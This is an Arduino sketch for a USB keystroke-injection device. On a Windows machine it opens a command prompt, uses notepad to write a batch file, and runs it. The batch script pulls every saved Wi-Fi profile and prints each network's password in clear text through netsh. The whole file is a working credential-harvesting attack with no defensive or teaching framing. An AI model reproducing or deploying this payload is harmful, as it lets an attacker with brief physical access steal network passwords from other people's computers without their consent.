#include <Keyboard.h>

bool complete = false;

void setup() {
  // put your setup code here, to run once:
  Keyboard.begin();
}

void loop() {
  if(!complete){
    //open cmdcmd
    
    delay(500);
    Keyboard.releaseAll();
    Keyboard.press(KEY_LEFT_GUI); 
    Keyboard.press('r');
    Keyboard.releaseAll();
    write("cmd");
    delay(100);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500);

    //open notepad 
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(KEY_UP_ARROW);
    Keyboard.releaseAll();
    writeEnter("notepad q.bat");
    delay(500);
    enter();
    
    //write script

    writeEnter("@echo off");
    writeEnter("setlocal enabledelayedexpansion");
    writeEnter("call :get-profiles r");
    writeEnter(":main-next-profile");
    writeEnter("for /f \"tokens=1* delims=,\" %%a in (\"%r%\") do (");
    writeEnter("call :get-profile-key \"%%a\" key");
    writeEnter("if \"!key!\" NEQ \"\" (");
    writeEnter("echo WiFi: [%%a] Password: [!key!]");
    writeEnter(")");
    writeEnter("set r=%%b");
    writeEnter(")");
    writeEnter("if \"%r%\" NEQ \"\" goto main-next-profile");
    writeEnter("echo.");
    writeEnter("pause");
    writeEnter("goto :eof");
    writeEnter(":get-profile-key <1=profile-name> <2=out-profile-key>");
    writeEnter("setlocal");
    writeEnter("set result=");
    writeEnter("FOR /F \"usebackq tokens=2 delims=:\" %%a in (");
    writeEnter("`netsh wlan show profile name^=\"%~1\" key^=clear ^| findstr /C:\"Key Content\"`) DO (");
    writeEnter("set result=%%a");
    writeEnter("set result=!result:~1!");
    writeEnter(")");
    writeEnter("(");
    writeEnter("endlocal");
    writeEnter("set %2=%result%");
    writeEnter(")");
    writeEnter("goto :eof");
    writeEnter(":get-profiles <1=result-variable>");
    writeEnter("setlocal");
    writeEnter("set result=");
    writeEnter("FOR /F \"usebackq tokens=2 delims=:\" %%a in (");
    writeEnter("`netsh wlan show profiles ^| findstr /C:\"All User Profile\"`) DO (");
    writeEnter("set val=%%a");
    writeEnter("set val=!val:~1!");
    writeEnter("set result=%!val!,!result!");
    writeEnter(")");
    writeEnter("(");
    writeEnter("endlocal");
    writeEnter("set %1=%result:~0,-1%");
    writeEnter(")");
    writeEnter("goto :eof");

    //CTRL + S, ALT + F4

    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press('s');
    Keyboard.releaseAll();
    //delay(250);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    Keyboard.releaseAll();

    //run it
    delay(500);
    writeEnter("q.bat");
    
    //exit
    Keyboard.releaseAll();
    complete = true;
  }
}

void enter(){
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
}

void write(char input[]){
  for(int n = 0; n < strlen(input); n++){
    Keyboard.write(input[n]);
  }
}

void writeEnter(char input[]){
  for(int n = 0; n < strlen(input); n++){
    Keyboard.write(input[n]);
  }
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
}
